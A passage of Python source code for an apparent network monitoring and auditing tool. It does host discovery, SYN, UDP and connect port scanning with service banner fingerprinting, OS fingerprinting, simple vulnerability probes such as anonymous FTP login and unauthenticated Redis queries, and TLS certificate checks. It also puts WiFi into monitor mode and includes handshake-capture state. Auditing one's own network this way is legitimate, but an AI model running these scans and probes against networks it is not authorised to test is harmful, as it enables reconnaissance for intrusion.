                {"mac": mac, "ip": ip, "hostname": hostname, "vendor": vendor,
                 "device_type": guess_device_type(hostname, vendor)}
            )
        return devices
    except Exception as e:
        print(f"[!] ARP scan failed: {e}")
        return fallback_scan(network_range)


def fallback_scan(network_range: str | None = None) -> list[dict]:
    if network_range is None:
        network_range = get_network_range()
    base = network_range.rsplit("/", 1)[0].rsplit(".", 1)[0]
    devices: list[dict] = []
    lock = Lock()

    def ping_host(ip: str):
        try:
            p = "n" if platform.system() == "Windows" else "c"
            w = "w" if platform.system() == "Windows" else "W"
            r = subprocess.run(["ping", f"-{p}", "1", f"-{w}", "1", ip],
                               capture_output=True, text=True, timeout=3)
            if r.returncode == 0:
                try:
                    hostname = socket.gethostbyaddr(ip)[0]
                except Exception:
                    hostname = ""
                mac = get_mac_from_arp(ip)
                vendor = get_vendor(mac) if mac else "Unknown"
                with lock:
                    devices.append({"mac": mac or f"UNKNOWN-{ip}", "ip": ip, "hostname": hostname,
                                    "vendor": vendor, "device_type": guess_device_type(hostname, vendor)})
        except Exception:
            pass

    threads = []
    for i in range(1, 255):
        ip = f"{base}.{i}"
        t = threading.Thread(target=ping_host, args=(ip,), daemon=True)
        t.start()
        threads.append(t)
        if len(threads) >= 60:
            for t in threads:
                t.join(timeout=4)
            threads = []
    for t in threads:
        t.join(timeout=4)
    return devices


def get_mac_from_arp(ip: str) -> str | None:
    try:
        if platform.system() == "Windows":
            r = subprocess.run(["arp", "-a", ip], capture_output=True, text=True)
        else:
            r = subprocess.run(["arp", "-n", ip], capture_output=True, text=True)
        for line in r.stdout.splitlines():
            if ip in line:
                for part in line.split():
                    if len(part) == 17 and (part.count(":") == 5 or part.count("-") == 5):
                        return part.upper().replace("-", ":")
    except Exception:
        pass
    return None


def update_devices_db(devices: list[dict]) -> int:
    conn = get_db()
    c = conn.cursor()
    now = datetime.now().isoformat()
    new_count = 0
    c.execute("UPDATE devices SET is_online = 0")
    for dev in devices:
        existing = c.execute("SELECT * FROM devices WHERE mac = ?", (dev["mac"],)).fetchone()
        if existing:
            c.execute(
                """UPDATE devices SET ip=?, hostname=CASE WHEN ?!='' THEN ? ELSE hostname END,
                   vendor=CASE WHEN ?!='Unknown' THEN ? ELSE vendor END,
                   device_type=CASE WHEN ?!='unknown' THEN ? ELSE device_type END,
                   last_seen=?, is_online=1 WHERE mac=?""",
                (dev["ip"], dev["hostname"], dev["hostname"],
                 dev["vendor"], dev["vendor"],
                 dev["device_type"], dev["device_type"], now, dev["mac"]),
            )
        else:
            c.execute(
                """INSERT INTO devices (mac, ip, hostname, vendor, device_type, first_seen, last_seen, is_online)
                   VALUES (?,?,?,?,?,?,?,1)""",
                (dev["mac"], dev["ip"], dev["hostname"], dev["vendor"],
                 dev["device_type"], now, now),
            )
            new_count += 1
            c.execute(
                "INSERT INTO alerts (timestamp, alert_type, message, device_mac) VALUES (?,?,?,?)",
                (now, "new_device", f"New device detected: {dev['ip']} ({dev['vendor']})", dev["mac"]),
            )
        save_os_fingerprint(c, dev["mac"], dev["ip"], dev["vendor"])
    conn.commit()
    conn.close()
    return new_count


def save_os_fingerprint(conn, mac: str, ip: str, vendor: str):
    try:
        with data_lock:
            obs = observed_tcp.get(ip)
            if not obs or not obs.get("ttl"):
                return
            ttl = obs["ttl"]
            window = obs.get("window") or 0
            dhcp_hostname = obs.get("dhcp_hostname") or ""
        os_guess, conf = guess_device_os(ttl, window, dhcp_hostname, vendor)
        if not os_guess or os_guess == "Unknown":
            return
        conn.execute(
            """INSERT INTO os_fingerprint_log
               (timestamp, device_mac, os_guess, confidence, ttl, tcp_window_size, dhcp_hostname)
               VALUES (?,?,?,?,?,?,?)
               ON CONFLICT(device_mac) DO UPDATE SET
                 timestamp=excluded.timestamp, os_guess=excluded.os_guess,
                 confidence=excluded.confidence, ttl=excluded.ttl,
                 tcp_window_size=excluded.tcp_window_size, dhcp_hostname=excluded.dhcp_hostname""",
            (datetime.now().isoformat(), mac, os_guess, conf, ttl, window, dhcp_hostname),
        )
    except Exception as e:
        print(f"[!] OS fingerprint save error: {e}")


def active_os_fingerprint(ip: str) -> dict | None:
    if not SCAPY_AVAILABLE:
        return None
    try:
        conf.verb = 0
        result = None
        for port in (80, 443, 22, 8080, 21):
            try:
                resp = sr1(IP(dst=ip) / TCP(dport=port, flags="S"), timeout=2, verbose=0)
                if resp and TCP in resp and resp[TCP].flags & 0x12:
                    result = resp
                    break
            except Exception:
                continue
        if result is None:
            return None
        ttl = result[IP].ttl
        window = result[TCP].window
        with data_lock:
            e = observed_tcp.setdefault(ip, {})
            e["ttl"] = ttl
            e["window"] = window
            e["last_seen"] = time.time()
        return {"ttl": ttl, "tcp_window_size": window}
    except Exception as e:
        print(f"[!] Active fingerprint error: {e}")
        return None


# ============================================================
# BATCH A: PORT SCANNING — SYN + UDP + service DB + fingerprinting
# ============================================================

# 80-port service database (port -> {name, probe, regexes[]})
SERVICE_DB: dict[int, dict] = {
    21:   {"name": "ftp",      "probe": b"HELP\r\n",     "regexes": [r"(?i)FTP", r"vsftpd ([\d.]+)", r"ProFTPD ([\d.]+)", r"FileZilla"]},
    22:   {"name": "ssh",      "probe": b"",            "regexes": [r"SSH-([\d.]+)-([\w\-.]+)"]},
    23:   {"name": "telnet",   "probe": b"\r\n",        "regexes": [r"(?i)telnet", r"Linux", r"BusyBox", r"\x00login"]},
    25:   {"name": "smtp",     "probe": b"EHLO x\r\n",  "regexes": [r"ESMTP", r"Postfix", r"Exim", r"Sendmail", r"Microsoft ESMTP"]},
    53:   {"name": "dns",      "probe": b"",            "regexes": [r"(?i)dns", r"BIND"]},
    67:   {"name": "dhcp",     "probe": b"",            "regexes": []},
    69:   {"name": "tftp",     "probe": b"\x00\x01test\x00octet\x00", "regexes": []},
    80:   {"name": "http",     "probe": b"GET / HTTP/1.0\r\nHost: x\r\n\r\n",
           "regexes": [r"Server: ([^\r\n]+)", r"X-Powered-By: ([^\r\n]+)", r"<title>([^<]+)</title>", r"(?i)apache[/\s]([\d.]+)", r"nginx[/\s]?([\d.]*)", r"cloudflare", r"Microsoft-IIS/([\d.]+)", r"Express", r"gunicorn", r"Flask", r"Django", r"PHP/([\d.]+)", r"Tomcat"]},
    81:   {"name": "http-alt", "probe": b"GET / HTTP/1.0\r\nHost: x\r\n\r\n", "regexes": [r"Server: ([^\r\n]+)", r"<title>([^<]+)</title>"]},
    88:   {"name": "kerberos", "probe": b"", "regexes": []},
    110:  {"name": "pop3",     "probe": b"",            "regexes": [r"\+OK", r"Dovecot", r"Courier"]},
    111:  {"name": "rpcbind",  "probe": b"", "regexes": []},
    113:  {"name": "ident",    "probe": b"", "regexes": []},
    123:  {"name": "ntp",      "probe": b"", "regexes": []},
    135:  {"name": "msrpc",    "probe": b"", "regexes": []},
    137:  {"name": "netbios-ns","probe": b"", "regexes": []},
    138:  {"name": "netbios-dg","probe": b"", "regexes": []},
    139:  {"name": "netbios-ssn","probe": b"", "regexes": [r"(?i)samba", r"Windows"]},
    143:  {"name": "imap",     "probe": b"",            "regexes": [r"\* OK", r"Dovecot", r"Courier", r"UW-IMAP"]},
    161:  {"name": "snmp",     "probe": b"", "regexes": []},
    199:  {"name": "smux",     "probe": b"", "regexes": []},
    389:  {"name": "ldap",     "probe": b"", "regexes": []},
    443:  {"name": "https",    "probe": b"",            "regexes": [r"(?i)http", r"cloudflare", r"nginx", r"apache"]},
    445:  {"name": "smb",      "probe": b"",            "regexes": [r"(?i)samba", r"Windows", r"SMB"]},
    465:  {"name": "smtps",    "probe": b"", "regexes": []},
    500:  {"name": "isakmp",   "probe": b"", "regexes": []},
    514:  {"name": "syslog",   "probe": b"", "regexes": []},
    515:  {"name": "printer",  "probe": b"", "regexes": []},
    520:  {"name": "route",    "probe": b"", "regexes": []},
    554:  {"name": "rtsp",     "probe": b"OPTIONS rtsp://x RTSP/1.0\r\n\r\n", "regexes": [r"RTSP", r"Server: ([^\r\n]+)"]},
    587:  {"name": "submission","probe": b"EHLO x\r\n", "regexes": [r"ESMTP"]},
    631:  {"name": "ipp",      "probe": b"", "regexes": [r"CUPS"]},
    636:  {"name": "ldaps",    "probe": b"", "regexes": []},
    873:  {"name": "rsync",    "probe": b"@RSYNCD:\x00", "regexes": [r"@RSYNCD:"]},
    902:  {"name": "vmware",   "probe": b"", "regexes": [r"VMware"]},
    993:  {"name": "imaps",    "probe": b"", "regexes": [r"\* OK"]},
    995:  {"name": "pop3s",    "probe": b"", "regexes": [r"\+OK"]},
    1025: {"name": "rpc",      "probe": b"", "regexes": []},
    1080: {"name": "socks",    "probe": b"\x05\x01\x00", "regexes": [r"\x05"]},
    1433: {"name": "mssql",    "probe": b"", "regexes": [r"Microsoft SQL"]},
    1521: {"name": "oracle",   "probe": b"", "regexes": []},
    1723: {"name": "pptp",     "probe": b"", "regexes": []},
    1883: {"name": "mqtt",     "probe": b"\x10\x0c\x00\x04MQTT\x04\x02\x00\x3c", "regexes": []},
    2049: {"name": "nfs",      "probe": b"", "regexes": []},
    2181: {"name": "zookeeper","probe": b"", "regexes": [r"ZooKeeper"]},
    2375: {"name": "docker",   "probe": b"GET /version HTTP/1.0\r\n\r\n", "regexes": [r"ApiVersion", r"Docker"]},
    2376: {"name": "docker-tls","probe": b"", "regexes": []},
    3000: {"name": "http-dev", "probe": b"GET / HTTP/1.0\r\nHost: x\r\n\r\n", "regexes": [r"Ruby on Rails", r"Express", r"webpack", r"Grafana", r"<title>([^<]+)</title>"]},
    3306: {"name": "mysql",    "probe": b"",            "regexes": [r"([0-9]+\.[0-9]+\.[0-9]+)", r"MariaDB", r"MySQL"]},
    3389: {"name": "rdp",      "probe": b"",            "regexes": []},
    5000: {"name": "http-alt", "probe": b"GET / HTTP/1.0\r\nHost: x\r\n\r\n", "regexes": [r"Flask", r"UPnP", r"<title>([^<]+)</title>"]},
    5432: {"name": "postgres", "probe": b"",            "regexes": [r"[EF]\x00\x00\x00", r"PostgreSQL"]},
    5601: {"name": "kibana",   "probe": b"GET / HTTP/1.0\r\nHost: x\r\n\r\n", "regexes": [r"kbn-name", r"kibana"]},
    5672: {"name": "amqp",     "probe": b"", "regexes": [r"AMQP"]},
    5900: {"name": "vnc",      "probe": b"RFB 003.008\n","regexes": [r"RFB ([\d.]+)"]},
    5984: {"name": "couchdb",  "probe": b"GET / HTTP/1.0\r\n\r\n", "regexes": [r"couchdb", r"CouchDB"]},
    6379: {"name": "redis",    "probe": b"INFO\r\n",    "regexes": [r"redis_version:([\w.]+)", r"redis"]},
    6443: {"name": "k8s-api",  "probe": b"", "regexes": []},
    7001: {"name": "weblogic", "probe": b"", "regexes": []},
    8000: {"name": "http-alt", "probe": b"GET / HTTP/1.0\r\nHost: x\r\n\r\n", "regexes": [r"Server: ([^\r\n]+)", r"Django", r"PHP", r"Apache", r"nginx", r"WP Rocket", r"<title>([^<]+)</title>"]},
    8008: {"name": "http-alt", "probe": b"GET / HTTP/1.0\r\nHost: x\r\n\r\n", "regexes": []},
    8080: {"name": "http-alt", "probe": b"GET / HTTP/1.0\r\nHost: x\r\n\r\n",
           "regexes": [r"Server: ([^\r\n]+)", r"Apache Tomcat[/\s]?([\d.]*)", r"Jetty", r"Jenkins", r"Jupyter", r"Spring", r"Express", r"nginx", r"Apache", r"<title>([^<]+)</title>"]},
    8081: {"name": "http-alt", "probe": b"GET / HTTP/1.0\r\nHost: x\r\n\r\n", "regexes": [r"Server: ([^\r\n]+)", r"<title>([^<]+)</title>"]},
    8443: {"name": "https-alt","probe": b"",            "regexes": []},
    8888: {"name": "http-alt", "probe": b"GET / HTTP/1.0\r\nHost: x\r\n\r\n", "regexes": [r"Jupyter", r"jupyter", r"<title>([^<]+)</title>"]},
    9000: {"name": "http-alt", "probe": b"GET / HTTP/1.0\r\nHost: x\r\n\r\n", "regexes": [r"SonarQube", r"php-fpm", r"<title>([^<]+)</title>"]},
    9090: {"name": "prometheus","probe": b"GET / HTTP/1.0\r\nHost: x\r\n\r\n", "regexes": [r"Prometheus", r"<title>([^<]+)</title>"]},
    9200: {"name": "elasticsearch","probe": b"GET / HTTP/1.0\r\n\r\n", "regexes": [r"\"cluster_name\"", r"\"version\"", r"lucene_version"]},
    9300: {"name": "es-transport","probe": b"", "regexes": []},
    11211:{"name": "memcached","probe": b"VERSION\r\n", "regexes": [r"VERSION ([\w.\-]+)"]},
    27017:{"name": "mongodb",  "probe": b"",            "regexes": []},
    50000:{"name": "jenkins-agent","probe": b"", "regexes": []},
}


BANNER_RX = re.compile(rb"([ -~]{4,})")


def _fingerprint_banner(banner_bytes: bytes, port: int) -> tuple[str, str]:
    """Return (service_name, version_string) from banner regexes."""
    svc = SERVICE_DB.get(port, {})
    name = svc.get("name", "unknown")
    if not banner_bytes:
        return name, ""
    text = banner_bytes.decode("utf-8", errors="ignore").replace("\x00", "")
    versions: list[str] = []
    for pat in svc.get("regexes", []):
        try:
            m = re.search(pat, text)
            if m:
                g = m.groups()
                versions.append(m.group(0) if not g else " ".join(g for g in g if g))
        except Exception:
            continue
    # Clean up
    version = " | ".join(versions[:3]) if versions else text.strip()[:80]
    version = re.sub(r"\s+", " ", version).strip()[:120]
    return name, version


def _connect_probe(ip: str, port: int, timeout: float = 1.5) -> bytes | None:
    svc = SERVICE_DB.get(port, {})
    probe = svc.get("probe", b"")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        try:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except Exception:
            pass
        data = b""
        if probe:
            s.sendall(probe)
        try:
            s.settimeout(timeout)
            data = s.recv(2048)
        except socket.timeout:
            pass
        s.close()
        return data
    except Exception:
        return None


def _syn_probe(ip: str, port: int, timeout: float = 1.0) -> bool:
    if not SCAPY_AVAILABLE:
        return False
    try:
        conf.verb = 0
        sport = secrets.randbelow(30000) + 30000
        syn = IP(dst=ip) / TCP(sport=sport, dport=port, flags="S", seq=secrets.randbits(32))
        resp = sr1(syn, timeout=timeout, verbose=0)
        if resp is None:
            return False
        if TCP in resp and (resp[TCP].flags & 0x12):  # SYN-ACK
            # RST to close
            rst = IP(dst=ip) / TCP(sport=sport, dport=port, flags="R", seq=(resp[TCP].ack))
            send(rst, verbose=0)
            return True
        return False
    except Exception:
        return False


def _udp_probe(ip: str, port: int, timeout: float = 2.0) -> bool:
    """Naive UDP open/filtered test: send a small probe; any response -> open."""
    if not SCAPY_AVAILABLE:
        return False
    try:
        conf.verb = 0
        payloads = {
            53: struct.pack("!HHHHHH", secrets.randbelow(65535), 0x0100, 1, 0, 0, 0)
                + b"\x07version\x04bind\x00\x00\x10\x00\x03",  # DNS TXT/BIND
            123: b"\x1b" + 47 * b"\0",  # NTP v3 symmetric
            161: b"\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x04\x01\x02\x03\x04\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00",  # SNMP public
            500: b"",  # ISAKMP
            514: b"",  # syslog no-reply
            1900: b"M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nMAN:\"ssdp:discover\"\r\nMX:1\r\nST:ssdp:all\r\n\r\n",
        }
        payload = payloads.get(port, b"\x00" * 8)
        sport = secrets.randbelow(30000) + 30000
        pkt = IP(dst=ip) / UDP(sport=sport, dport=port) / Raw(load=payload)
        resp = sr1(pkt, timeout=timeout, verbose=0)
        return resp is not None
    except Exception:
        return False


def run_port_scan(ip: str, port_range: str = "1-1024", scan_type: str = "connect", device_mac: str | None = None):
    """Dispatcher: scan_type in {connect, syn, udp}."""
    m = re.match(r"^(\d{1,5})-(\d{1,5})$", port_range)
    if not m:
        return []
    start, end = int(m.group(1)), int(m.group(2))
    start, end = max(1, start), min(65535, end)
    if start > end:
        start, end = end, start
    if (end - start) > 20000:
        end = start + 20000

    open_ports: list[dict] = []
    plock = Lock()

    def check_tcp(port: int):
        is_open = False
        if scan_type == "syn":
            is_open = _syn_probe(ip, port)
        else:
            # connect scan
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.75)
                r = s.connect_ex((ip, port))
                s.close()
                is_open = r == 0
            except Exception:
                is_open = False
        if is_open:
            banner = _connect_probe(ip, port)
            svc_name, version = _fingerprint_banner(banner or b"", port)
            entry = {"port": port, "service": svc_name, "state": "open",
                     "version": version, "banner": (banner or b"")[:200].hex(),
                     "scan_type": scan_type}
            with plock:
                open_ports.append(entry)
            if device_mac:
                log_port_to_history(device_mac, ip, port, svc_name, scan_type)

    def check_udp(port: int):
        if _udp_probe(ip, port):
            banner = None
            svc_name, version = _fingerprint_banner(banner or b"", port)
            entry = {"port": port, "service": svc_name, "state": "open|filtered",
                     "version": version, "scan_type": "udp"}
            with plock:
                open_ports.append(entry)
            if device_mac:
                log_port_to_history(device_mac, ip, port, svc_name, "udp")

    check = check_udp if scan_type == "udp" else check_tcp
    workers = 80 if scan_type == "syn" else 120
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [ex.submit(check, p) for p in range(start, end + 1)]
        for f in as_completed(futs):
            try:
                f.result()
            except Exception:
                pass
    return sorted(open_ports, key=lambda x: x["port"])


def log_port_to_history(device_mac: str, device_ip: str, port: int, service: str, scan_type: str = "connect"):
    try:
        conn = get_db()
        now = datetime.now().isoformat()
        existing = conn.execute(
            "SELECT * FROM port_scan_history WHERE device_mac=? AND port=?", (device_mac, port)
        ).fetchone()
        if existing:
            conn.execute(
                "UPDATE port_scan_history SET last_seen=?, is_new=0, scan_type=? WHERE device_mac=? AND port=?",
                (now, scan_type, device_mac, port),
            )
        else:
            conn.execute(
                """INSERT INTO port_scan_history (timestamp, device_mac, device_ip, port, service, scan_type, first_seen, last_seen, is_new)
                   VALUES (?,?,?,?,?,?,?,?,1)""",
                (now, device_mac, device_ip, port, service, scan_type, now, now),
            )
            generate_alert(
                "new_open_port",
                f"New open port detected on {device_ip}: {port} ({service}) [{scan_type}]",
                device_mac,
            )
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"[!] port history error: {e}")


def vulnerability_scan(ip: str) -> list[dict]:
    # Basic checks for anonymous FTP, Telnet, old OpenSSH, HTTP Basic auth.
    out: list[dict] = []
    probe_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5900, 6379, 27017]
    for port in probe_ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            r = s.connect_ex((ip, port))
            s.close()
            if r != 0:
                continue
            if port == 21 and FTPLIB_AVAILABLE:
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(ip, 21, timeout=3)
                    ftp.login("anonymous", "anon@")
                    ftp.quit()
                    out.append({"port": 21, "service": "FTP", "vulnerability": "Anonymous FTP login allowed", "severity": "medium", "description": "FTP allows anonymous access."})
                except Exception:
                    pass
            elif port == 22:
                banner = _connect_probe(ip, 22, timeout=1.5)
                if banner:
                    t = banner.decode("utf-8", errors="ignore").lower()
                    m = re.search(r"openssh[_/\s-]+([0-9]+\.[0-9]+)", t)
                    if m:
                        try:
                            ma, mi = map(int, m.group(1).split("."))
                            if ma < 7 or (ma == 7 and mi < 4):
                                out.append({"port": 22, "service": "SSH", "vulnerability": f"Old OpenSSH: {m.group(1)}", "severity": "medium", "description": "SSH banner reports old version."})
                        except Exception:
                            pass
            elif port == 23:
                out.append({"port": 23, "service": "Telnet", "vulnerability": "Telnet exposed (plaintext)", "severity": "high", "description": "Telnet transmits credentials in plaintext."})
            elif port == 80 and REQUESTS_AVAILABLE:
                try:
                    resp = requests.get(f"http://{ip}", timeout=2, verify=False)
                    wa = resp.headers.get("www-authenticate", "")
                    if resp.status_code == 401 and "basic" in wa.lower():
                        out.append({"port": 80, "service": "HTTP", "vulnerability": "HTTP Basic Auth (base64 credentials)", "severity": "medium", "description": "HTTP Basic transmits credentials in reversible base64."})
                    # Missing security headers
                    miss = []
                    for h in ("x-frame-options", "content-security-policy", "strict-transport-security"):
                        if h not in {k.lower() for k in resp.headers.keys()}:
                            miss.append(h)
                    if miss:
                        out.append({"port": 80, "service": "HTTP", "vulnerability": f"Missing headers: {', '.join(miss)}", "severity": "low", "description": "Common security headers not present."})
                except Exception:
                    pass
            elif port == 6379:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1.5)
                    s.connect((ip, 6379))
                    s.sendall(b"INFO\r\n")
                    data = s.recv(512)
                    s.close()
                    if b"redis_version" in data:
                        out.append({"port": 6379, "service": "Redis", "vulnerability": "Redis open (no auth likely)", "severity": "high", "description": "Redis responds unauthenticated."})
                except Exception:
                    pass
            elif port == 27017:
                out.append({"port": 27017, "service": "MongoDB", "vulnerability": "Check MongoDB auth binding", "severity": "medium", "description": "MongoDB port open; verify bind_ip & auth."})
        except Exception:
            continue
    return out


def grab_tls_cert(host: str, port: int = 443, timeout: float = 3.0) -> dict | None:
    """Fetch a TLS certificate and parse it into a dict."""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((host, port), timeout=timeout) as s:
            with ctx.wrap_socket(s, server_hostname=host) as ss:
                der = ss.getpeercert(binary_form=True)
                cipher = ss.cipher()
        if not der or not CRYPTO_AVAILABLE:
            return {"host": host, "port": port, "error": "no cert / cryptography unavailable"}
        cert = x509.load_der_x509_certificate(der, default_backend())
        subj = cert.subject.rfc4514_string()
        issuer = cert.issuer.rfc4514_string()
        nb = cert.not_valid_before_utc.isoformat() if hasattr(cert, "not_valid_before_utc") else cert.not_valid_before.isoformat()
        na = cert.not_valid_after_utc.isoformat() if hasattr(cert, "not_valid_after_utc") else cert.not_valid_after.isoformat()
        try:
            days = (cert.not_valid_after_utc - datetime.utcnow()).days if hasattr(cert, "not_valid_after_utc") else (cert.not_valid_after - datetime.utcnow()).days
        except Exception:
            days = None
        is_self_signed = cert.issuer == cert.subject
        try:
            san = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
            san_list = san.value.get_values_for_type(x509.DNSName)
        except Exception:
            san_list = []
        return {
            "host": host, "port": port, "subject": subj, "issuer": issuer,
            "not_before": nb, "not_after": na, "days_until_expiry": days,
            "is_self_signed": is_self_signed, "san": san_list,
            "serial": str(cert.serial_number),
            "sig_algo": cert.signature_algorithm_oid._name,
            "cipher": {"name": cipher[0], "version": cipher[1], "bits": cipher[2]} if cipher else None,
            "weak_cipher": bool(cipher and cipher[2] and cipher[2] < 128),
        }
    except Exception as e:
        return {"host": host, "port": port, "error": str(e)[:200]}


# ============================================================
# WIFI INFO / SECURITY (kept from original, expanded)
# ============================================================
def get_wifi_info() -> dict:
    info = {"ssid": "N/A", "signal": "N/A", "channel": "N/A", "frequency": "N/A",
            "security": "N/A", "bssid": "N/A", "interface": get_wifi_interface() or "N/A"}
    try:
        sys = platform.system()
        if sys == "Windows":
            r = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True)
            for line in r.stdout.splitlines():
                line = line.strip()
                if "SSID" in line and "BSSID" not in line and ":" in line:
                    info["ssid"] = line.split(":", 1)[1].strip()
                elif "Signal" in line:
                    info["signal"] = line.split(":", 1)[1].strip()
                elif "Channel" in line and "BSSID" not in line:
                    info["channel"] = line.split(":", 1)[1].strip()
                elif "Radio type" in line:
                    info["frequency"] = line.split(":", 1)[1].strip()
                elif "Authentication" in line:
                    info["security"] = line.split(":", 1)[1].strip()
                elif "BSSID" in line:
                    info["bssid"] = line.split(":", 1)[1].strip()
        elif sys == "Linux":
            # iw dev <iface> info
            iface = get_wifi_interface()
            if iface and shutil.which("iw"):
                r = subprocess.run(["iw", "dev", iface, "info"], capture_output=True, text=True)
                for line in r.stdout.splitlines():
                    line = line.strip()
                    if line.startswith("ssid "):
                        info["ssid"] = line.split(None, 1)[1]
                    elif line.startswith("channel "):
                        parts = line.split()
                        info["channel"] = parts[1]
                        if len(parts) > 2:
                            info["frequency"] = parts[2].strip("()")
                r2 = subprocess.run(["iw", "dev", iface, "link"], capture_output=True, text=True)
                for line in r2.stdout.splitlines():
                    if "signal:" in line:
                        info["signal"] = line.split("signal:")[1].strip()
                    if "freq:" in line:
                        info["frequency"] = line.split("freq:")[1].strip().split()[0]
                    if "SSID:" in line:
                        info["ssid"] = line.split("SSID:", 1)[1].strip()
                    if line.strip().startswith("Connected to "):
                        info["bssid"] = line.split("Connected to", 1)[1].strip().split()[0].upper()
            # try nmcli
            if shutil.which("nmcli"):
                r = subprocess.run(["nmcli", "-t", "-f", "ACTIVE,SSID,SIGNAL,CHAN,SECURITY", "dev", "wifi"],
                                   capture_output=True, text=True)
                for line in r.stdout.splitlines():
                    if line.startswith("yes:"):
                        parts = line.split(":")
                        if len(parts) >= 5:
                            info["ssid"] = parts[1] or info["ssid"]
                            info["signal"] = f"{parts[2]}%" if parts[2] else info["signal"]
                            info["channel"] = parts[3] or info["channel"]
                            info["security"] = parts[4] or info["security"]
        elif sys == "Darwin":
            airport = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
            if os.path.exists(airport):
                r = subprocess.run([airport, "-I"], capture_output=True, text=True)
                for line in r.stdout.splitlines():
                    if line.strip().startswith("SSID:"):
                        info["ssid"] = line.split(":", 1)[1].strip()
                    elif "agrCtlRSSI:" in line:
                        try:
                            rssi = int(line.split(":", 1)[1].strip())
                            info["signal"] = f"{min(100, max(0, 2*(rssi+100)))}% ({rssi} dBm)"
                        except Exception:
                            pass
                    elif "channel:" in line:
                        info["channel"] = line.split(":", 1)[1].strip().split(",")[0]
                    elif "BSSID:" in line:
                        info["bssid"] = line.split(":", 1)[1].strip()
    except Exception as e:
        print(f"[!] wifi info error: {e}")
    return info


def wifi_security_scan(wifi_info: dict | None = None) -> dict:
    si = {"encryption": "Unknown", "wps": "Unknown", "hidden_ssid": False,
          "mac_filtering": "Unknown", "recommendations": []}
    if wifi_info is None:
        wifi_info = get_wifi_info()
    sec = str(wifi_info.get("security", "") or "").lower()
    if "wpa3" in sec:
        si["encryption"] = "WPA3"
    elif "wpa2" in sec:
        si["encryption"] = "WPA2"
    elif "wpa" in sec:
        si["encryption"] = "WPA"
    elif "wep" in sec:
        si["encryption"] = "WEP (weak)"
        si["recommendations"].append("Upgrade WEP -> WPA2/WPA3")
    elif "open" in sec or not sec:
        si["encryption"] = "Open/Unknown"
        si["recommendations"].append("Enable WPA2/WPA3.")
    if not wifi_info.get("ssid") or wifi_info.get("ssid") == "N/A":
        si["hidden_ssid"] = True
        si["recommendations"].append("Hidden SSID is not a security control.")
    if "wep" in sec:
        si["recommendations"].append("WEP is broken; rotate passphrase after upgrade.")
    return si


# ---- WiFi monitor-mode helpers (Linux: airmon-ng preferred, iw fallback) ----
def _run(cmd: list[str], timeout: int = 15) -> tuple[int, str, str]:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode, r.stdout, r.stderr
    except Exception as e:
        return 999, "", str(e)


def wifi_supported() -> bool:
    if platform.system() != "Linux":
        return False
    return bool(shutil.which("iw")) or bool(shutil.which("airmon-ng"))


def wifi_enable_monitor(iface: str | None = None, channel: int | None = None) -> tuple[bool, str]:
    global wifi_state
    if not wifi_supported():
        return False, "WiFi monitoring requires Linux with iw/airmon-ng"
    iface = iface or get_wifi_interface()
    if not iface:
        return False, "No wireless interface found"
    try:
        # Kill conflicting processes
        if shutil.which("airmon-ng"):
            _run(["airmon-ng", "check", "kill"], timeout=10)
            rc, out, err = _run(["airmon-ng", "start", iface], timeout=20)
            # airmon-ng prints monitor iface name like "phy0	wlan0mon"
            mon_iface = None
            for line in (out + err).splitlines():
                m = re.search(r"(\S+)\s+monitor mode enabled", line)
                if m:
                    mon_iface = m.group(1)
            if not mon_iface:
                # try adding "mon"
                mon_iface = iface + "mon"
            # set channel
            if channel and shutil.which("iw"):
                _run(["iw", "dev", mon_iface, "set", "channel", str(channel)], timeout=5)
            wifi_state["original_interface"] = iface
            wifi_state["monitor_interface"] = mon_iface
            wifi_state["monitor_active"] = True
            return True, f"Monitor mode enabled on {mon_iface}"
        if shutil.which("iw"):
            _run(["ip", "link", "set", iface, "down"], timeout=5)
            _run(["iw", iface, "set", "monitor", "none"], timeout=5)
            _run(["ip", "link", "set", iface, "up"], timeout=5)
            if channel:
                _run(["iw", iface, "set", "channel", str(channel)], timeout=5)
            wifi_state["original_interface"] = iface
            wifi_state["monitor_interface"] = iface
            wifi_state["monitor_active"] = True
            return True, f"Monitor mode enabled on {iface} (iw)"
        return False, "Need iw or airmon-ng"
    except Exception as e:
        return False, f"monitor-mode error: {e}"


def wifi_disable_monitor() -> tuple[bool, str]:
    global wifi_state
    try:
        wifi_state["survey_running"] = False
        wifi_state["handshake_capture_running"] = False
        mon = wifi_state.get("monitor_interface")
        orig = wifi_state.get("original_interface") or get_wifi_interface()
        if shutil.which("airmon-ng") and mon:
            _run(["airmon-ng", "stop", mon], timeout=20)
        elif shutil.which("iw") and orig:
            _run(["ip", "link", "set", orig, "down"], timeout=5)
            _run(["iw", orig, "set", "type", "managed"], timeout=5)
            _run(["ip", "link", "set", orig, "up"], timeout=5)
        _run(["systemctl", "restart", "NetworkManager"], timeout=10) if shutil.which("systemctl") else None
        wifi_state["monitor_active"] = False
        wifi_state["monitor_interface"] = None
        wifi_state["original_interface"] = orig
        return True, "Managed mode restored"
    except Exception as e:
        return False, f"restore error: {e}"


def _current_frequency(iface: str) -> int | None:
    try:
        with open(f"/sys/class/net/{iface}/frequency", "r") as f:
            return int(float(f.read().strip()))
    except Exception:
        return None


def _channel_hopper(iface: str, channels=(1, 6, 11) + tuple(range(1, 15)) + tuple(range(36, 149, 4)), dwell=0.4):
